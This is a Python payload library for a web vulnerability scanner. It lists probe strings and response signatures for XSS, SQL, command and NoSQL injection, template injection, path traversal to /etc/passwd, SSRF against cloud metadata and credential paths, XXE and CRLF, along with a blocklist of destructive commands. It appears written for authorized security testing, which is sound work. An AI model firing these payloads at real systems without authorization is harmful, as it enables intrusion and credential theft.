"""
Safe active-testing payload library + detection signatures.

Powers the aegis/active DAST engine. Every payload here is SAFE-BY-DEFAULT:
  * non-destructive — no data-mutating/destructive strings (no DROP/DELETE/rm/shutdown);
    a hard blocklist (`is_destructive`) refuses them even if someone adds one.
  * blind/second-order detection uses TIME markers or an out-of-band canary token
    (see common.oob) — never data exfiltration or damage.
  * payloads carry a unique per-run marker so a reflection is unambiguously OURS.

Active testing is authorized-targets-only. The engine MUST route every request through the
scope/authorization guard (orchestrator.gates) so a payload can only ever hit the allowlist.

Each entry: {id, technique(ATT&CK), cwe, payloads[], signatures[], kind, note}.
`kind`: reflect | error | boolean | time | oob | header | redirect.
"""
import re
import secrets
from typing import Dict, List

MARKER = "wcs" + secrets.token_hex(4)  # unique per process; proves a reflection is ours


def canary() -> str:
    """Per-injection unique marker (for reflection / OOB correlation)."""
    return MARKER + secrets.token_hex(3)


# ---- hard safety blocklist: destructive tokens are NEVER sent, even if injected here ----
_DESTRUCTIVE = re.compile(
    r"(?i)\b(drop\s+table|truncate\s+table|delete\s+from|shutdown|;\s*rm\s|rm\s+-rf|"
    r"mkfs|format\s+c:|:\(\)\{|fork\s*bomb|insert\s+into|update\s+\w+\s+set|--\s*drop)\b")


def is_destructive(payload: str) -> bool:
    return bool(_DESTRUCTIVE.search(payload or ""))


def safe(payloads: List[str]) -> List[str]:
    """Filter out anything destructive — belt-and-suspenders before sending."""
    return [p for p in payloads if not is_destructive(p)]


# Time-based blind marker; engine measures round-trip delta vs a baseline.
SLEEP_SECONDS = 6

CATALOG: Dict[str, Dict] = {
    "xss_reflected": {
        "technique": "T1189", "cwe": "CWE-79", "kind": "reflect",
        "payloads": ["<{m}>", "\"><svg/onload=1 data-{m}>", "'\"><b>{m}</b>", "javascript:/*{m}*/"],
        "signatures": ["<{m}>", "<b>{m}</b>", "<svg/onload=1 data-{m}>"],
        "note": "reflection unencoded in HTML context -> XSS; confirm execution context.",
    },
    "sqli_error": {
        "technique": "T1190", "cwe": "CWE-89", "kind": "error",
        "payloads": ["'", "\"", "')", "'--", "' {m}"],
        "signatures": [r"SQL syntax", r"mysql_fetch", r"ORA-\d{5}", r"PostgreSQL.*ERROR",
                       r"SQLite/JDBCDriver", r"Unclosed quotation mark", r"quoted string not properly terminated"],
        "note": "DB error on a quote -> injectable; error-based.",
    },
    "sqli_boolean": {
        "technique": "T1190", "cwe": "CWE-89", "kind": "boolean",
        "payloads": ["' AND '1'='1", "' AND '1'='2", " AND 1=1-- {m}", " AND 1=2-- {m}"],
        "signatures": [], "note": "differential true/false response length/content -> boolean-blind.",
    },
    "sqli_time": {
        "technique": "T1190", "cwe": "CWE-89", "kind": "time",
        "payloads": ["' AND SLEEP({s})-- {m}", "'; SELECT pg_sleep({s})-- {m}",
                     "' WAITFOR DELAY '0:0:{s}'-- {m}", " || pg_sleep({s})"],
        "signatures": [], "note": "response delayed ~{s}s -> time-blind SQLi.",
    },
    "cmd_injection": {
        "technique": "T1059", "cwe": "CWE-78", "kind": "time",
        "payloads": [";sleep {s}", "|sleep {s}", "$(sleep {s})", "`sleep {s}`", "& ping -n {s} 127.0.0.1"],
        "signatures": [], "note": "command delay -> OS command injection (time-safe, no data change).",
    },
    "ssti": {
        "technique": "T1190", "cwe": "CWE-94", "kind": "reflect",
        "payloads": ["${{7*7}}", "{{7*7}}", "#{{7*7}}", "<%= 7*7 %>", "{{'{m}'}}"],
        "signatures": ["49", "{m}"], "note": "arithmetic evaluated (49) -> server-side template injection.",
    },
    "path_traversal": {
        "technique": "T1190", "cwe": "CWE-22", "kind": "signature",
        "payloads": ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                     "....//....//etc/passwd", "../../../../windows/win.ini"],
        "signatures": [r"root:.*:0:0:", r"\[extensions\]", r"\[fonts\]"],
        "note": "sensitive file content in response -> path traversal / LFI (read-only).",
    },
    "ssrf": {
        "technique": "T1190", "cwe": "CWE-918", "kind": "oob",
        "payloads": ["http://{oob}", "http://169.254.169.254/latest/meta-data/",
                     "http://metadata.google.internal/computeMetadata/v1/", "http://127.0.0.1:80/"],
        "signatures": [r"ami-id", r"instance-id", r"computeMetadata", r"iam/security-credentials"],
        "note": "OOB callback or cloud-metadata reflected -> SSRF. Metadata canary is READ-ONLY.",
    },
    "open_redirect": {
        "technique": "T1189", "cwe": "CWE-601", "kind": "redirect",
        "payloads": ["https://example.org/{m}", "//example.org/{m}", "/\\example.org/{m}"],
        "signatures": ["example.org"], "note": "Location header points off-origin -> open redirect.",
    },
    "xxe": {
        "technique": "T1190", "cwe": "CWE-611", "kind": "oob",
        "payloads": ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://{oob}">]><r>&x;</r>'],
        "signatures": [], "note": "OOB fetch on entity -> XXE. No local-file exfil payloads bundled.",
    },
    "crlf": {
        "technique": "T1190", "cwe": "CWE-113", "kind": "header",
        "payloads": ["%0d%0aX-{m}:1", "\r\nX-{m}:1"],
        "signatures": ["x-{m}: 1"], "note": "injected header appears in response -> CRLF/header injection.",
    },
    "nosqli": {
        "technique": "T1190", "cwe": "CWE-943", "kind": "boolean",
        "payloads": ['{"$gt":""}', '{"$ne":null}', "'||'1'=='1"],
        "signatures": [], "note": "auth/filter bypass via operator injection -> NoSQL injection.",
    },
}


def build(entry_id: str, oob_host: str = "") -> List[Dict]:
    """Materialize an entry's payloads with fresh markers. Returns [{payload, signatures, meta}]."""
    e = CATALOG[entry_id]
    m = canary()
    out = []
    for raw in safe(e["payloads"]):
        p = raw.format(m=m, s=SLEEP_SECONDS, oob=oob_host or "OOB_UNSET")
        sigs = [s.format(m=m, s=SLEEP_SECONDS) for s in e["signatures"]]
        out.append({"payload": p, "signatures": sigs, "marker": m,
                    "id": entry_id, "kind": e["kind"], "technique": e["technique"],
                    "cwe": e["cwe"], "note": e["note"].format(s=SLEEP_SECONDS)})
    return out


def all_ids() -> List[str]:
    return sorted(CATALOG)
